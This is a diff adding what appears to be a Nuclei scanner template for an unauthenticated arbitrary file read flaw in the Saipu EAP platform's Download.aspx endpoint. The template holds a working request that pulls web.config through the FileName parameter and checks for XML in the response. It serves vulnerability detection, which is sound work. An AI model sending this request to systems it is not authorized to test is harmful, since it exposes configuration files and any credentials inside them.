@@ -1,0 +1,20 @@
+id: saipu-Download-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 赛普EAP企业适配管理平台 Download.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统文件，造成信息泄露。
+  reference:
+    - https://github.com/wy876/POC/commit/e9ebc9ab7da2132f9afa9e813bfa98b15375ffca#diff-8ea45b08dda31db1fbe153387db3bad63b569fd71b9555c53e4716bdfd3acdccR1
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle="
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
